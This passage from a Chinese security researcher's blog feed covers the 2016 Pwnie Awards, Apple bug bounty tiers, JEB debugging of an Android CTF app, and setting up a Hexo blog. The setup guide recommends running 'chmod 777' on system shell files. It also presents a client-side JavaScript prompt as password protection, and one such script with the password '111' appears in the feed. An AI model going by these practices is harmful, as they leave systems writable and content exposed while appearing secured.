<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p><a href="http://resources.infosecinstitute.com/ios-application-security-part-1-setting-up-a-mobile-pentesting-platform/" target="_blank" rel="external">英文</a><br><a href="http://security.ios-wiki.com/" target="_blank" rel="external">iOS Security 中文</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。&lt;br&gt;(模块会发生变动)&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>2016 Pwnie Awards</title>
    <link href="http://yoursite.com/2017/02/08/2016-Pwnie-Awards/"/>
    <id>http://yoursite.com/2017/02/08/2016-Pwnie-Awards/</id>
    <published>2017-02-08T05:01:24.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>2016 Black Hat重点记录</p>
<h3 id="精品漏洞"><a href="#精品漏洞" class="headerlink" title="精品漏洞"></a>精品漏洞</h3><a id="more"></a>
<p>Pwnie Awards 2016获奖名单揭晓</p>
<p>素有网络安全奥斯卡之称的Pwnie Awards正式公布各个奖项的归属。有关这个奖的分量就不必再多说了，我们直接来看获奖名单。</p>
<p><strong>最佳服务器BUG奖</strong>（Pwnie for Best Server-Side Bug）：Cisco ASA IKEv1/IKEv2 Fragmentation Heap Buffer Overflow缓冲溢出（CVE-2016-1287）。传说中最有趣、技术上精制复杂的服务器端漏洞利用。</p>
<p><strong>最佳客户端BUG奖</strong>（Pwnie for Best Client-Side Bug）：glibc getsddrinfo堆栈缓冲溢出（CVE-2015-7547）。</p>
<p><strong>最佳提权BUG奖</strong>（Pwnie for Best Privilege Escalation Bug）：Widevine QSEE TrustZone Privilege Escalation（CVE-2015-6639），就是前一阵影响Android系统高通芯片TrustZone的漏洞。</p>
<p><strong>最佳加密攻击奖</strong>（Pwnie for Best Crytographic Attack）：SSLv2 Crypto攻击（DROWN Attack）（CVE-2016-0800）。这个奖项是今年首度出现的，授予那些采用新奇的方式来打破加密系统的安全研究人员。</p>
<p><strong>最炫Hack奖</strong>（Pwnie for Best Junk or Stunt Hack）：远程劫持高速公路上的Jeep——去年比较火热针对切诺基的远程攻击。这个奖的英文原名其实很有趣，各位可以体会以下，有关这个奖的描述是这样的：“授予研究人员，及他们的公关团队，还有参与其中的记者，为其产生的超高公众影响力，甚至可能致许多不懂技术的朋友和家人会惊慌失措打来电话的技术。”</p>
<p><strong>最佳品牌奖</strong>（Pwnie for Best Branding）：Mousejack无线键盘注入BUG。这个奖授予话最大努力解释和宣传其发现的安全漏洞的企业。</p>
<p><strong>史诗成就奖</strong>（Pwnie for Epic Achievement）：Tavis Ormandy（针对他去年侵入绝大部分反病毒程度而颁发）。又一个全新的奖项，听着都感觉很高端，这个奖专门颁给那些获得前所未有的“成绩”（notoriery）的研究人员。</p>
<p><strong>最佳创新研究奖</strong>（Pwnie for Most Innovative Research）： Dedup Est Machina：Memory Deduplication as an Advanced Exploitation Vector（将内存重复数据删除作为高级利用向量，这是篇论文）。这个奖是颁给那些公布最有趣研究，即便研究还没实现的研究人员。</p>
<p><strong>最过分夸大BUG奖</strong>（Pwnie for Most Over-hyped Bug）：Badlock（CVE-2016-0128）。这个奖颁给被媒体过分关注，但实际上根本就没那么危险的安全漏洞。</p>
<p>最佳歌曲奖（Pwnie for Best Song）：Cyber-lair，来自Katie Moussouris。</p>
<p><strong>史诗级0wnage奖</strong>（Pwnie for Epic 0wnage）：Juniper Backdoor后门。此奖授予对企业或产品产生极大危害的研究人员或安全漏洞。</p>
<p><strong>终身成就奖</strong>：Mudge，Peiter C.Zatko。长期以来从事漏洞研究的教育专家、在安全行业有较大影响力，先前曾领导DARPA网络安全项目。</p>
<h3 id="Apple-漏洞奖励计划"><a href="#Apple-漏洞奖励计划" class="headerlink" title="Apple 漏洞奖励计划"></a>Apple 漏洞奖励计划</h3><table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2016 Black Hat重点记录&lt;/p&gt;
&lt;h3 id=&quot;精品漏洞&quot;&gt;&lt;a href=&quot;#精品漏洞&quot; class=&quot;headerlink&quot; title=&quot;精品漏洞&quot;&gt;&lt;/a&gt;精品漏洞&lt;/h3&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="blackhat-2016" scheme="http://yoursite.com/tags/blackhat-2016/"/>
    
  </entry>
  
  <entry>
    <title>happy new year</title>
    <link href="http://yoursite.com/2017/02/04/happy-new-year/"/>
    <id>http://yoursite.com/2017/02/04/happy-new-year/</id>
    <published>2017-02-03T17:32:43.000Z</published>
    <updated>2017-03-09T16:04:46.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
  </entry>
  
  <entry>
    <title>jeb-v2.2.7真机调试 APK(nodebug)</title>
    <link href="http://yoursite.com/2017/01/24/jeb-v2-2-7%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95-APK-nodebug/"/>
    <id>http://yoursite.com/2017/01/24/jeb-v2-2-7真机调试-APK-nodebug/</id>
    <published>2017-01-23T16:31:49.000Z</published>
    <updated>2017-03-09T16:28:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。</p>
<a id="more"></a>
<h2 id="JEB2-2-7-调试阿里2016移动安全-第三题-app部分"><a href="#JEB2-2-7-调试阿里2016移动安全-第三题-app部分" class="headerlink" title="JEB2.2.7 调试阿里2016移动安全 第三题-app部分"></a>JEB2.2.7 调试阿里2016移动安全 第三题-app部分</h2><blockquote>
<p>说明：</p>
<pre><code>1. app debugable 开关关闭。我采用刷ROM(userdebug 版本)的方式绕过。
2. 测试手机: Nexus 5x
3. Android 版本: 6.0.1
</code></pre></blockquote>
<script>
    if( prompt("Please input password") !== String(111) )
    {
        alert('密码错误！');
        self.location='https://floatingguy.github.io/about/';
        // history.back();
    } else {
        alert("密码正确");
    }
</script>

<hr>
<p>工具：jeb-v2.2.7<br>需要配置的环境变量：JEB_HOME 和 ANDROID_SDK。</p>
<h3 id="bug-统计"><a href="#bug-统计" class="headerlink" title="bug 统计"></a>bug 统计</h3><ol>
<li>jeb动态调试BUG:<br> ANDROID_SDK配置完全正确，但是每次 debug 时都显示<code>找不到 ADB</code>。</li>
</ol>
<p>原因：我是通过Alfred 通过开启的 jeb.app， 这种方式访问不到环境变量所以找不到 ADB。<br>解决：</p>
<pre><code>1. 可以通过写脚本，每次在终端执行  （完成 jeb_debug...sh）
2. 到 jeb目录下执行 jeb_mac.sh
</code></pre><h3 id="jeb注意事项："><a href="#jeb注意事项：" class="headerlink" title="jeb注意事项："></a>jeb注意事项：</h3><pre><code>1. 只有在 bytecode view时才可以 debug
2. 视频中可以从 art 指令直接跳转到 so汇编中执行，但是我本次测试时不行。。。
3. localval 窗口显示的只有 数字没有字符不知道怎么对应。
</code></pre><h3 id="jeb-快捷键："><a href="#jeb-快捷键：" class="headerlink" title="jeb 快捷键："></a>jeb 快捷键：</h3><pre><code>* 下断点：cmd+B
* 反编译：q
* 后退/前进： alt+ ←/→
</code></pre><h2 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h2><p>在上传 gif 解析时，app中将 URL 强制从<code>URLConnection</code>转换成了 <code>HTTPURLConnection</code>类型，所以我们json文件中的<code>address</code>值必须包含<code>http://</code>否则会抛出<code>MalformedURLException</code>异常</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.pnfsoftware.com/blog/jeb-android-debuggers/" target="_blank" rel="external">AN INTRODUCTION TO JEB ANDROID DEBUGGERS</a><br><a href="https://www.pnfsoftware.com/blog/category/jeb2/" target="_blank" rel="external">ADVANCED DEBUGGER USAGE VIA THE INTERPRETER</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="jeb" scheme="http://yoursite.com/tags/jeb/"/>
    
      <category term="动态调试" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
      <category term="Armv8-64" scheme="http://yoursite.com/tags/Armv8-64/"/>
    
  </entry>
  
  <entry>
    <title>配置hexo + github page 个人Blog</title>
    <link href="http://yoursite.com/2017/01/22/%E9%85%8D%E7%BD%AEhexo-github-page-%E4%B8%AA%E4%BA%BABlog/"/>
    <id>http://yoursite.com/2017/01/22/配置hexo-github-page-个人Blog/</id>
    <published>2017-01-22T04:52:26.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h2 id="基础配置（一）"><a href="#基础配置（一）" class="headerlink" title="基础配置（一）"></a>基础配置（一）</h2><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><a id="more"></a>
<p>1.install nodejs-v6.9.4</p>
<pre><code>下载zip package
</code></pre><ol>
<li>安装Nodejs<br> ubuntu: <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nodejs</div><div class="line"><span class="comment">#检查版本</span></div><div class="line">node -v</div></pre></td></tr></table></figure>
</li>
</ol>
<p>如果nodejs 版本不是 <strong>v6.9.4</strong>,那么需要去官网下载按照包：</p>
<p>安装release版 <a href="http://www.ctolib.com/topics-106467.html" target="_blank" rel="external">Nodejs</a></p>
<blockquote>
<p>如果命令行下载不了 nodejs:<br>安装过程 官网下载好，解压。终端 mv node-v6.9.4-linux-x64 /opt/ 输入命令：sudo chmod 777 /etc/profile，进入目录下，备份一下，这里我是用 sublime text 打<br>开的，在末尾添加以下三行：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> NODE_HOME=/opt/node-v6.9.4-linux-x64</div><div class="line"><span class="built_in">export</span> PATH=PATH:PATH:NODE_HOME/bin</div><div class="line"><span class="built_in">export</span> NODE_PATH=<span class="variable">$NODE_HOME</span>/lib/node_modules</div></pre></td></tr></table></figure>
<blockquote>
<p>之后按保存退出 在命令行输入：source /etc/profile，然后在命令行输入：node -v，返回版本信息v6.9.4，说明环境变量配置就生效了；但，你会发现进入root账户，改配置并没有生效 在命令行输入：sudo chmod 777 /root/.bashrc,进入所在目录，备份好文件，并在文件末尾加入一行source /etc/profile命令，保存。这样就大功告成了。 操作完后记得将权限改回去。</p>
</blockquote>
<p>3.install nodejs-legacy</p>
<pre><code>sudo apt-get install nodejs-legacy
</code></pre><p>4.install hexo</p>
<pre><code>sudo npm install -g hexo-cli --registry=https://registry.npm.taobao.org
</code></pre><h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir <span class="variable">$Blog</span>-name &amp;&amp; <span class="built_in">cd</span> <span class="variable">$Blog</span>-name</div><div class="line">hexo init <span class="variable">$blog</span></div><div class="line"><span class="built_in">cd</span> <span class="variable">$blog</span></div></pre></td></tr></table></figure>
<h3 id="Hexo-用法"><a href="#Hexo-用法" class="headerlink" title="Hexo 用法"></a>Hexo 用法</h3><ol>
<li><p>常用命令列表：</p>
<ol>
<li><strong>~ generate <g>        #生成静态文件</g></strong></li>
<li><strong>~ server <s>          #本地预览环境</s></strong></li>
<li><strong>~ new “paper name”    #创建博文</strong></li>
<li><strong>~ deploy <d>          #部署</d></strong></li>
<li>~ new page “page name”  #创建页面<br>本地测试在浏览器中打开 localhost:4000</li>
</ol>
</li>
<li><p>Hexo根目录结构</p>
</li>
</ol>
<ul>
<li><p>需要上传到 source repo 的文件</p>
<p>  #全局配置文件，站点基本信息(title/subtitle/author/..), 主题 …<br>  -rw-rw-r–  1 floatg floatg 1.5K  1月 21 16:51 _config.yml</p>
<p>  #所有博文都在source/目录下<br>  drwxrwxr-x  3 floatg floatg 4.0K  1月 21 16:51 source<br>  drwxrwxr-x  2 floatg floatg 4.0K  1月 21 16:51 scaffolds<br>  -rw-rw-r–  1 floatg floatg  448  1月 21 17:07 package.json</p>
<p>  #所有可以使用的主题都在这个目录下，每个主题对应一个文件夹<br>  drwxrwxr-x  4 floatg floatg 4.0K  1月 21 17:17 themes<br>  -rw-r–r–  1 floatg floatg  77B  1 23 15:39 .gitignore</p>
</li>
<li><p>.gitignore 过滤的文件</p>
<p>  -rw-rw-r–  1 floatg floatg  24K  1月 21 17:07 db.json<br>  drwxrwxr-x 12 floatg floatg 4.0K  1月 21 16:53 node_modules<br>  drwxrwxr-x  7 floatg floatg 4.0K  1月 21 17:07 public<br>  drwxr-xr-x   17 floatg  floatg   578B  1 23 15:16 .deploy_git</p>
</li>
</ul>
<p>#本地测试脚本<br>    -rwxr-xr-x    1 floatg  floatg    91B  1 23 14:38 rtest.sh<br>    -rw-r–r–@   1 floatg  floatg   6.0K  1 23 14:55 .DS_Store</p>
<h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>目前 我找到的主题比较少，只有默认的landscape 和huno，较喜欢huno。</p>
<ol>
<li><p>下载主题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> themes</div><div class="line">git <span class="built_in">clone</span> git@github.com:someus/huno.git</div></pre></td></tr></table></figure>
</li>
<li><p>分析主题</p>
<ol>
<li>cyanstyle 可以设置背景图片,并且page主体是一个半透明的theme, 建议背景图片搞一个深色的图</li>
<li>huno  左右布局，极简风格，category,目录等基本功能齐全</li>
<li>landscape 上下布局</li>
<li>icarus  感觉是设计，艺术风，推荐给@Alian。 这个主体还有一些<a href="https://github.com/ppoffice/hexo-theme-icarus/issues" target="_blank" rel="external">bug</a>,测试的时候存在显示<a href="https://github.com/ppoffice/hexo-theme-icarus/wiki" target="_blank" rel="external">问题</a></li>
<li>aero-dual  上下布局，喜欢配色</li>
<li>yelee    很喜欢， 冬天显示列表+目录</li>
<li>xnew      目录+归档–按日期排列</li>
<li>GhoSadillaX  使用中</li>
</ol>
</li>
</ol>
<h2 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h2><p>(更多内容)[<a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a>]<br>(统计)[<a href="http://busuanzi.ibruce.info/" target="_blank" rel="external">http://busuanzi.ibruce.info/</a>]</p>
<p>hexo config review<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">hexo: 3.2.2</div><div class="line">hexo-cli: 1.0.2</div><div class="line">os: Linux 4.x.x-xx-generic linux xxx</div><div class="line">http_parser: 1.0</div><div class="line">node: 0.10.25</div><div class="line">v8: 3.xx.5.9</div><div class="line">ares: 1.10.0</div><div class="line">uv: 0.10.23</div><div class="line">zlib: 1.2.8</div><div class="line">modules: 11</div><div class="line">openssl: x.x.xf</div></pre></td></tr></table></figure></p>
<h2 id="夸主机同步-Blog"><a href="#夸主机同步-Blog" class="headerlink" title="夸主机同步 Blog"></a>夸主机同步 Blog</h2><h3 id="CI辅助自动部署"><a href="#CI辅助自动部署" class="headerlink" title="CI辅助自动部署"></a>CI辅助自动部署</h3><p>参考文章:<br><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/" target="_blank" rel="external">http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/</a><br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/" target="_blank" rel="external">https://formulahendry.github.io/2016/12/04/hexo-ci/</a></p>
<p>我首先尝试了使用appveyor 做CI的办法，效果不尽如人意。主要的问题在：</p>
<pre><code>1. nodejs, hexo的版本和我本地不同，导致命令 解析都不一样。解决办法：可以在yml中下载制定版本
2. 使用作者的yml, 直接把我content repo下的内容删除了连site都打不开了。
3. 执行速度很慢，push完成以后貌似要到[appveyor管理页面](https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io)去点击 **new build** 才能执行下去。
</code></pre><p>虽然有一些bug，不过还是蛮有趣的产品。先说下原理，再说下大概的步骤：</p>
<ol>
<li><p>原理：CI工具(这里是appveyor)会监控代码管理(github)中指定repo的commit记录, 发现有新的commit 就会将代码拉取到CI主机上，然后去执行repo根目录下的appveyor.yml中的命令。</p>
</li>
<li><p>步骤:</p>
<ol>
<li>open appveyor <a href="https://ci.appveyor.com/projects" target="_blank" rel="external">projects page</a></li>
<li>create new projects, choose Github, source-code repo (支持的所有代码管理工具)</li>
<li>add appveyor.yml to source-code repo root directory</li>
<li>get Token from <a href="https://help.github.com/articles/creating-an-access-token-for-command-line-use/" target="_blank" rel="external">Github</a></li>
<li>CI platform to <a href="https://ci.appveyor.com/tools/encrypt" target="_blank" rel="external">encrypt Token page</a></li>
<li>set CI environment<ul>
<li>STATIC_SITE_REPO    – github content repo</li>
<li>TARGET_BRANCH       – content repo branch</li>
<li>GIT_USER_EMAIL      – github account</li>
<li>GIT_USER_NAME       – github username</li>
</ul>
</li>
<li>oK,  you can using your blog， finally push source repo</li>
<li><strong>Debug</strong> project page can monitor appveyor.yml file <a href="https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io" target="_blank" rel="external">console</a></li>
</ol>
</li>
</ol>
<p><del>最终没有找到好的解决办法,目前就先这样啦,等找到办法了再来更新</del></p>
<h3 id="github-托管-source"><a href="#github-托管-source" class="headerlink" title="github 托管 source"></a>github 托管 source</h3><p>原理就是将常用电脑上的 blog根目录下建立 git仓库(source repo)，然后注意哪些文件要上传，哪些不能上传。以后可以在任意一台电脑上将 source repo clone 到本地，然后按照下面的步骤来配置。<br>步骤：</p>
<ol>
<li>安装 node-v6.9.4</li>
<li>clone 到本地以后，进入 repo目录然后安装工具&amp;模块。</li>
<li><p>执行下面的命令就可以配置好 hexo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm install hexo --save</div><div class="line">npm install</div><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
</li>
<li><p>下面就是测试 server,generate,deploy命令了</p>
</li>
</ol>
<p>再来总结一下哪些文件需要上传，哪些不能上传：<br>上传:</p>
<pre><code>* _config.yml
* theme/
* source/
* scaffolds/
* package.json
* .gitignore
</code></pre><p>theme 下所有的.git/目录要删除，.gitignore 根据需要做修改。</p>
<p>不上传:</p>
<pre><code>* .git/
* db.json
* node_modules/
* public/
* .deploy_git/
</code></pre><blockquote>
<p>我遇到的坑, 在使用 GhoSadillaX 主题时，因为其gitignore 不上传_config.yml, 导致在 mac 上测试一直显示 duoshao 没配置short_name, 最后还是把 theme下的_config.yml找回来才解决。</p>
</blockquote>
<h3 id="hexo-博文设置-密码验证"><a href="#hexo-博文设置-密码验证" class="headerlink" title="hexo 博文设置 密码验证"></a>hexo 博文设置 密码验证</h3><p>首先，我们要了解 hexo 支持 markdown和javascript 混合编程。那么要实现对 单独的blog 加密，就可以在md 文件中嵌入一段校验密码的 js代码，如果要对所有的 blog 加密可以在 theme 中的 layout/_partial/header.ejs文件中添加一段校验密码的 js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    <span class="keyword">if</span>( prompt(<span class="string">"Please input password"</span>) !== <span class="built_in">String</span>(&#123;&#123; password &#125;&#125;) )</div><div class="line">    &#123;</div><div class="line">        alert(<span class="string">'密码错误！'</span>);</div><div class="line">        self.location=<span class="string">'http://localhost:4000/about/'</span>;</div><div class="line">        <span class="comment">// history.back();</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"密码正确"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>password 可以在 md文件头部设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: xxx</div><div class="line">date: 2017-</div><div class="line">tags:  [xx,zz]</div><div class="line">categories:</div><div class="line">password: password</div><div class="line">---</div></pre></td></tr></table></figure></p>
<h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><h3 id="本地测试脚本"><a href="#本地测试脚本" class="headerlink" title="本地测试脚本"></a>本地测试脚本</h3><p>rtest.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Bhome=/home/floatg/data/FG-B<span class="built_in">log</span>/hexo/blog</div><div class="line">killall -9 hexo</div><div class="line"><span class="built_in">cd</span> <span class="variable">$Bhome</span></div><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
<h3 id="gitignore-内容"><a href="#gitignore-内容" class="headerlink" title=".gitignore 内容"></a>.gitignore 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">*.log</div><div class="line">/.deploy*</div><div class="line">/_config.yml</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">rtest.sh</div><div class="line">db.json</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;基础配置（一）&quot;&gt;&lt;a href=&quot;#基础配置（一）&quot; class=&quot;headerlink&quot; title=&quot;基础配置（一）&quot;&gt;&lt;/a&gt;基础配置（一）&lt;/h2&gt;&lt;h3 id=&quot;工具安装&quot;&gt;&lt;a href=&quot;#工具安装&quot; class=&quot;headerlink&quot; title=&quot;工具安装&quot;&gt;&lt;/a&gt;工具安装&lt;/h3&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
      <category term="AppVeyor" scheme="http://yoursite.com/tags/AppVeyor/"/>
    
      <category term="CI" scheme="http://yoursite.com/tags/CI/"/>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
  </entry>
  
</feed>
